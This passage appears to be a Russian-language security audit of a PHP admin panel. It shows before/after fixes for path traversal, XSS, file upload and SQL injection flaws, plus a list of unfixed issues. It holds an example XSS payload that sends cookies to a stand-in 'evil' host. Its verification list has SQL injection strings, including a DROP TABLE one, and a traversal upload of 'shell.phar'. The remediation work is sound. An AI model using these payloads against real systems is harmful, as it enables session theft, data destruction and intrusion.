function db\_error($query) {

&#x20;   global $mysqli;

&#x20;   error\_log("DB error: " . ($mysqli ? $mysqli->error : "") . " | " . $query);

&#x20;   return "<br /><br />Ошибка выполнения запроса.<br /><br />";

}

```

\*\*Решает:\*\* утечку структуры БД и XSS; подробности пишутся в `error\_log`. Аналогично `db\_connect()` (I-15) больше не печатает `connect\_error`.



\---



\### I-01 / I-02 - `$page` из `REQUEST\_URI`, High / Medium

\*\*Причина:\*\* `$page` берётся из `REQUEST\_URI` (сырой, не декодированный, без нормализации: `curl --path-as-is`), подставляется в `include` и в атрибуты `class`. Значения вроде `../../x` дают path traversal, а `"><script>` - XSS.



\*\*Было:\*\*

```php

$page = rtrim($page\_array\[1], "/");

...

$main\_file = $\_SERVER\["DOCUMENT\_ROOT"] . "/admin/parts/" . $page . ".php";

if (file\_exists($main\_file)) { include $main\_file; }

...

<html lang="ru" class="html-<?= $page ?>">   <body class="admin admin-<?= $page ?>">

```

\*\*Стало:\*\*

```php

$page = rtrim($page\_array\[1] ?? "", "/");

if (!preg\_match('/^\[A-Za-z0-9\_-]+$/', $page)) { $page = ""; }

...

if (preg\_match('/^\[A-Za-z0-9\_-]+$/', $page) \&\& file\_exists($main\_file)) { include $main\_file; }   // повторная проверка в самой функции

...

<html lang="ru" class="html-<?= html\_esc($page) ?>">   <body class="admin admin-<?= html\_esc($page) ?>">

```

\*\*Решает:\*\* LFI/path traversal в `include` (вместе с `.php` на конце это включение любого `.php` на сервере) и отражённый XSS. Поведение страниц `login` / `main` не меняется.



\### I-03..I-07 - сессия и данные БД в HTML/JS, High / Medium

\*\*Причина:\*\* `NL\_USER\_SHORT` и `NL\_USER\_PHONE` вводятся в справочнике «Пользователи» (а с учётом N-01/N-02 их может изменить не только администратор), попадают в сессию и подставляются в HTML и в `<script>` без экранирования. Например, краткое имя `"; fetch('//evil/'+document.cookie);//` выполнится у каждого, чей интерфейс его выводит (в т.ч. у администратора). Так же значения справочников в `value : "..."`: экранировался только `"`, а `\\`, `</script>` нет.



\*\*Было:\*\*

```php

// main.php

<span class="admin\_\_userName"><?= $\_SESSION\["NL\_USER\_SHORT"] ?></span>

// getjqGridCustom

if (row\["ID\_NL\_USER"] != "' . $\_SESSION\["NL\_USER\_SHORT"] . '") {

// renderTable: телефон по умолчанию

$colModelEditOptions .= 'defaultValue : "' . $col->defValue . '"';

// renderTable: справочник

$colModelEditOptions .= 'value : "'; ... ":" . mb\_ereg\_replace('"', '\\\\"', $row\[$selectTableName . "\_SHORT"]); ... $colModelEditOptions .= '"';

// числа из сессии в JS

$colObject->defValue = $\_SESSION\["ID\_NL\_USER"];

if ($(formid.selector + " #ID\_NL\_USER").val() == ' . $\_SESSION\["ID\_NL\_USER"] . ') {

```

\*\*Стало:\*\*

```php

// main.php

<span class="admin\_\_userName"><?= htmlspecialchars((string)($\_SESSION\["NL\_USER\_SHORT"] ?? ""), ENT\_QUOTES, "UTF-8") ?></span>

// getjqGridCustom

if (row\["ID\_NL\_USER"] != ' . js\_str($\_SESSION\["NL\_USER\_SHORT"] ?? "") . ') {

// renderTable

$colModelEditOptions .= 'defaultValue : ' . js\_str($col->defValue);

$selectOptions = ""; $selectOptions .= ':не выбрано'; ... $selectOptions .= ";" . $row\[...] . ":" . $row\[$selectTableName . "\_SHORT"];

$colModelEditOptions .= 'value : ' . js\_str($selectOptions);

$colObject->defValue = (int)($\_SESSION\["ID\_NL\_USER"] ?? 0);

if ($(formid.selector + " #ID\_NL\_USER").val() == ' . (int)($\_SESSION\["ID\_NL\_USER"] ?? 0) . ') {

```

\*\*Решает:\*\* XSS/внедрение JS через сессионные значения и справочники. `js\_str` экранирует кавычки, `\\`, переводы строк и `< > \&` (нельзя закрыть `</script>`).

\*Замечание:\* формат jqGrid `value` - строка `id:текст;id:текст`; `:` или `;` в названии справочника ломают разбор и раньше (функциональное ограничение, не безопасность).



\### I-08 - `onlymy.php`, Low

\*\*Было:\*\*

```php

$\_SESSION\["onlymy"] = $\_POST\["onlymy"];

```

\*\*Стало:\*\*

```php

$\_SESSION\["onlymy"] = (($\_POST\["onlymy"] ?? "") === "1") ? "1" : "0";

```

\*\*Решает:\*\* в сессию попадает только флаг, а не произвольные данные/массив (значение потом сравнивается в `getTableWhere` и выводится в `main.php`).



\### I-09 / I-10 - `file.upload.php`, Critical / High

\*\*Причина:\*\* `table`, `col`, `id` из `$\_REQUEST` (включая COOKIE) идут в имя файла: `table=../../../var/www/html/x` даёт запись вне `/img`. `$tbl` используется как \*\*регулярное выражение\*\* в `mb\_ereg\_replace`. Защита от PHP - чёрный список из 5 расширений (`.phar`, `.php7`, `.pht`, `.phps`, `.htaccess`, `.inc` проходят). Проверки ошибки загрузки нет.



\*\*Было:\*\*

```php

$blacklist = array(".php", ".phtml", ".php3", ".php4", ".php5");

...

$tbl = $\_REQUEST\["table"];

$col = mb\_ereg\_replace($tbl . "\_", "", $\_REQUEST\["col"]);

$dir = strtolower(str\_replace("NL\_", "", $tbl));

$id = $\_REQUEST\["id"];

$filename = "/img/" . $dir . "/" . $col . "\_" . $id . "\_" . $date . ".$ext";

```

\*\*Стало (ключевое):\*\*

```php

$input = array\_merge($\_GET, $\_POST);                       // без COOKIE

$tbl = $input\["table"] ?? "";

if (!ObjectTable::isAllowedTable($tbl)) { upload\_fail("Bad table."); }

$id = $input\["id"] ?? "";

if (!is\_string($id) || !ctype\_digit($id) || (strlen($id) > 18)) { upload\_fail("Bad id."); }

// колонка - только существующая колонка таблицы типа photo/photos/file

foreach ($table->colArray as $key => $c) {

&#x20;   if (is\_int($key) \&\& ($c->dbName === $colParam) \&\& in\_array($c->type, array("photo", "photos", "file"), true)) { $colObj = $c; break; }

}

if ($colObj === null) { upload\_fail("Bad column."); }

$col = str\_replace($tbl . "\_", "", $colObj->dbName);

$ext = strtolower(pathinfo($baseFileName, PATHINFO\_EXTENSION));

$allowedExt = ($colObj->type === "file") ? array("jpg","jpeg","png","gif","webp","pdf","doc","docx","xls","xlsx") : array("jpg","jpeg","png","gif","webp");

if (!in\_array($ext, $allowedExt, true)) { upload\_fail("This file type is not allowed!"); }

if ($colObj->type !== "file" \&\& @getimagesize($baseTmpName) === false) { upload\_fail("File is not an image!"); }

// + проверка UPLOAD\_ERR\_OK / is\_uploaded\_file

```

\*\*Решает:\*\* запись за пределы `/img`, regex-инъекцию, загрузку исполняемых файлов. Все части имени файла теперь либо из кода, либо цифры, либо из белого списка. Подробнее об ограничении выполнения PHP в `/img` - раздел 5 (N-07).



\### I-11 - очистка фото в `saveData()`, High

\*\*Причина:\*\* маска `glob()` строилась из `$values\[0]` - первого значения формы (ID записи), то есть из `$\_POST`. `ID\_NL\_PROP\_RESALE=\*` или `../../..` позволяют удалить `unlink()`-ом чужие `.jpg`. Кроме того, `count(json\_decode(...))` падает на невалидном JSON (PHP 8).



\*\*Было:\*\*

```php

$trueId = $id;

if ((isset($values\[0])) \&\& (trim($values\[0]) != "") \&\& ($values\[0] != "NULL")) { $trueId = $values\[0]; }

foreach (glob($imgsPath . str\_replace($this->dbName . "\_", "", $col->dbName) . "\_" . $trueId . "\*.jpg") as $fullFileName) {

&#x20;   ...

&#x20;   $photos = json\_decode($post\[$col->dbName]);

&#x20;   for ($ji = 0; $ji < count($photos); $ji++) { ... }

```

\*\*Стало:\*\*

```php

$trueId = ($id === false) ? 0 : $id;

if (isset($params\[0]) \&\& is\_int($params\[0]) \&\& ($params\[0] > 0)) { $trueId = $params\[0]; }   // значение уже проверено prepareValue()

if ($trueId > 0) {

&#x20;   $found = glob($imgsPath . ... . "\_" . $trueId . "\*.jpg");

&#x20;   foreach (($found ?: array()) as $fullFileName) {

&#x20;       ...

&#x20;       $photos = json\_decode((string)($post\[$col->dbName] ?? ""), true);

&#x20;       if (!is\_array($photos)) { $photos = array(); }

```

\*\*Решает:\*\* произвольное удаление файлов и падение на битом JSON. `trueId = 0` (запись без id) больше не превращается в маску `col\_\*.jpg`, удалявшую фото всех записей.



\### I-12 - XML-ответ `showData()`, Medium

\*\*Причина:\*\* `page`/`total`/`records` и значения ячеек выводятся в XML без экранирования; строка `]]>` в данных закрывает `CDATA` и позволяет внедрить разметку.



\*\*Было:\*\*

```php

$s .= '<row id="' . $data\[$i]\[0] . '">';

$s .= '<cell><!\[CDATA\[' . $data\[$i]\[$j] . ']]></cell>';

```

\*\*Стало:\*\*

```php

$s .= '<row id="' . htmlspecialchars((string)$data\[$i]\[0], ENT\_QUOTES | ENT\_XML1, "UTF-8") . '">';

$s .= '<cell><!\[CDATA\[' . str\_replace("]]>", "]]]]><!\[CDATA\[>", (string)$data\[$i]\[$j]) . ']]></cell>';

// page/total/records теперь (int) из showData()

```

\*\*Решает:\*\* внедрение в XML. Экранирование HTML-содержимого ячеек (stored XSS при рендере jqGrid) сознательно не делается на этом этапе: оно зависит от `js.combined.js` (formatters `photosFormatter`, Quill), которого нет во вложении; см. N-06.



\### I-14 - шаблон `jqgrid.html`, Low

\*\*Было / стало:\*\*

```php

$jqGridHtml = mb\_ereg\_replace("{colModel}", $colModel, $jqGridHtml);

$jqGridHtml = str\_replace("{colModel}", $colModel, $jqGridHtml);      // то же для tableName, colNames, addEditForm, afterShowFormAdd, afterShowFormEdit

```

\*\*Решает:\*\* `mb\_ereg\_replace` трактует шаблон как регулярное выражение, а строку замены - с обратными ссылками `\\0..\\9`; данные из БД (названия справочников) с `\\0` подставляются неверно. `str\_replace` подставляет буквально.



\---



\## 4. Проход по файлам



| Файл | Что найдено (этап 1) | Статус |

|---|---|---|

| `admin/index.php` | `$\_POST` login/password -> `user\_auth`; `$page` в HTML (I-02) | Исправлено (S-01, I-02) |

| `admin/partial/jqgrid.html` | Шаблон; `{tableName}` подставляется в JS/URL | Без правок, защита в `ObjectTable` (S-02) |

| `admin/parts/dicts.php`, `journals.php`, `login.php` | Статичный HTML, `$\_GET`/`$\_SESSION` не используются | Проблем этапа 1 нет |

| `admin/parts/main.php` | `$\_SESSION\["NL\_USER\_SHORT"]` в HTML (I-03) | Исправлено |

| `admin/php/file.upload.php` | `$\_REQUEST`/`$\_FILES` в путь и regex (I-09, I-10) | Исправлено, файл переписан |

| `admin/php/functions.admin.php` | S-01..S-11, S-14, I-01..I-07, I-11, I-12, I-14 | Исправлено |

| `admin/php/jqgrid.edit.php` | `$\_GET tblName`, `$\_POST oper/id` без проверки | Исправлено (S-02, S-06, S-08) |

| `admin/php/jqgrid.show.php`, `jqgrid.table.php` | `$\_GET tblName` | Исправлено (S-02) |

| `admin/php/logout.php` | `$\_GET/$\_POST/$\_SESSION` не используются; logout без проверки метода (CSRF) | Проблем этапа 1 нет, см. N-05 |

| `admin/php/onlymy.php` | `$\_POST` в `$\_SESSION` (I-08) | Исправлено |

| `admin/php/select.get.php` | S-13 | Исправлено |

| `admin/php/set\_id.php` | S-12 | Исправлено |

| `php/config.php` | Входных данных нет; секреты в коде (N-04) | Без правок |

| `php/functions.php` | Нет обёртки для prepared; `db\_error` печатает SQL; `db\_connect` раскрывает ошибку; `db\_fetch\_array` не определена | Исправлено |



\---



\## 5. Найдено вне рамок этапа 1 (правки \*\*не\*\* вносились)



| ID | Sev. | Проблема | Где |

|---|---|---|---|

| N-01 | \*\*Critical\*\* | \*\*Нет проверки авторизации в endpoint-ах.\*\* Проверка входа есть только в `index.php` (HTML-страница). `jqgrid.show.php` (чтение всех данных), `jqgrid.edit.php` (запись/удаление), `jqgrid.table.php`, `set\_id.php`, `select.get.php`, `file.upload.php` (загрузка файлов), `onlymy.php` доступны анониму; прямой доступ к `/admin/parts/\*.php` тоже. Даже после исправлений этапа 1 любой может читать и править данные | все `admin/php/\*.php` |

| N-02 | \*\*Critical\*\* | \*\*Повышение привилегий / mass assignment в `saveData()`:\*\* пользователь с правами `1` может выполнить `edit`/`add` для таблицы `NL\_USER` и поставить `ID\_NL\_USER\_PERMISSION=2` (проверка владельца `row\_cur\["ID\_NL\_USER"]` для таблицы пользователей сравнивает его самого с собой) или переназначить `ID\_NL\_USER` записи. Нет проверки прав на таблицу и на поля | `saveData()` |

| N-03 | High | Пароли хранятся через обратимый `AES\_ENCRYPT` (ECB, ключ в исходниках) и расшифрованными уходят в грид (`AES\_DECRYPT` в `getData`). Нужно `password\_hash()` / `password\_verify()`, значения не отдавать клиенту | `user\_auth`, `getData`, колонка `NL\_PASSWORD` |

| N-04 | High | Секреты в коде: пароль БД и `AESKEY` в `config.php`. Вынести в переменные окружения / файл вне webroot | `php/config.php` |

| N-05 | High | Нет CSRF-токенов на POST; `logout.php` по GET; `user\_logout()` не уничтожает сессию; нет `HttpOnly`/`Secure`/`SameSite` для cookie; нет защиты от перебора пароля | `index.php`, `logout.php`, `user\_logout()` |

| N-06 | High | Stored XSS при выводе данных: содержимое ячеек грид отдаётся как есть и вставляется jqGrid как HTML; `$.parseHTML($(el).val())` в `dataInit` для фото (DOM XSS); Quill/`JSON.parse(decodeURIComponent(...))`. Нужен `js.combined.js` для корректной правки | `renderTable()`, `showData()`, JS |

| N-07 | Medium | Директория `/img` должна быть без исполнения PHP (`php\_admin\_flag engine off` / `.htaccess`); лимит размера; имена файлов предсказуемы (`col\_id\_дата`); каталог загрузки (`/img/<table>/`) не совпадает с каталогом очистки (`/img/objects/<TABLE>/`) | `file.upload.php`, `saveData()` |

| N-08 | Medium | Утечка данных: колонка «Контакт собственника» скрывается только в форме, но приходит в XML всем (`render=false` лишь скрывает колонку). Нужна фильтрация на сервере | `showData()` / `getData()` |

| N-09 | Medium | `set\_id.php` при каждом открытии формы увеличивает `AUTO\_INCREMENT` (гонки, выжигание id) | `set\_id.php` |

| N-10 | Medium | Серверная валидация: `maxLength`, `required` не проверяются на сервере | `saveData()` |

| N-11 | Low | Кодировка соединения `utf8` (лучше `utf8mb4`); `display\_errors`, короткие теги `<?`; внешний скрипт `//api-maps.yandex.ru` без протокола/SRI; нет security-заголовков (CSP, X-Frame-Options, X-Content-Type-Options) | `config.php`, `index.php` |



\---



\## 6. Допущения и что проверить после внедрения



1\. \*\*Окружение:\*\* PHP 7.4+/8.x (используются `??`, spread `...`, `const` с массивом), mysqli с `mysqlnd` (`get\_result()`). В среде, где готовился отчёт, PHP не было, поэтому код \*\*не запускался\*\*: проверены баланс синтаксиса, все точки формирования SQL (`grep` по `SELECT/INSERT/UPDATE/DELETE/ALTER`) и логика по коду. Перед сдачей прогнать `php -l` на каждом файле и ручной smoke-test.

2\. \*\*Поведение, которое изменилось намеренно:\*\*

&#x20;   - `rows` ограничен 1000; неизвестные параметры фильтра и сортировка по полю не из таблицы игнорируются (сортировка по умолчанию - `ID\_<таблица>`);

&#x20;   - нечисловое значение для числовой колонки в фильтре возвращает пустой результат, а в форме - HTTP 400;

&#x20;   - колонка пароля недоступна для поиска/сортировки;

&#x20;   - счётчик записей в гриде учитывает ограничения доступа (раньше ограничение применялось только к данным);

&#x20;   - загрузка: только белый список расширений и реальные изображения;

&#x20;   - `saveData()` больше не печатает SQL в ответ.

3\. \*\*Prepared statements и типы:\*\* при бинарном протоколе числовые колонки возвращаются как числа PHP; если в гриде заметите отличия отображения `FLOAT`, это нужно проверить на реальной схеме БД.

4\. \*\*Файлы, которых нет во вложении\*\* (`js.combined.js`, схема БД): параметры jqGrid (`sidx`, `sord`, `page`, `rows`, `NL\_\*`, `\*\_from`, `\*\_to`), формат запросов `select.get.php` и `set\_id.php` приняты по исходникам. Если в JS используются другие имена параметров или GET для `set\_id.php`, достаточно поправить соответствующую строку.

5\. \*\*Проверочные запросы\*\* (до правок должны срабатывать, после - нет):

&#x20;   - вход: `login=admin' OR '1'='1' -- \&password=x`;

&#x20;   - сортировка: `/admin/php/jqgrid.show.php?tblName=NL\_PROP\_RESALE\&sidx=(SELECT SLEEP(5))\&sord=asc`;

&#x20;   - фильтр: `...\&NL\_PROP\_RESALE\_FLOOR=1 OR 1=1`;

&#x20;   - таблица: `tblName=NL\_USER WHERE 1=1` -> HTTP 400;

&#x20;   - `set\_id.php`: `table=NL\_VIEW; DROP TABLE NL\_LOG` -> HTTP 400;

&#x20;   - `select.get.php`: `tblChild=NL\_USER\&tblParent=NL\_USER\_PERMISSION\&idParent=1 OR 1=1` -> только `idParent=1`;

&#x20;   - загрузка: `table=../../x` и файл `shell.phar` -> HTTP 400.

6\. \*\*Файлы дампа:\*\* в дампе `config.php` и `functions.php` склеены маркером; в исправленных файлах они разделены (лишний `<?` в конце `config.php` убран).

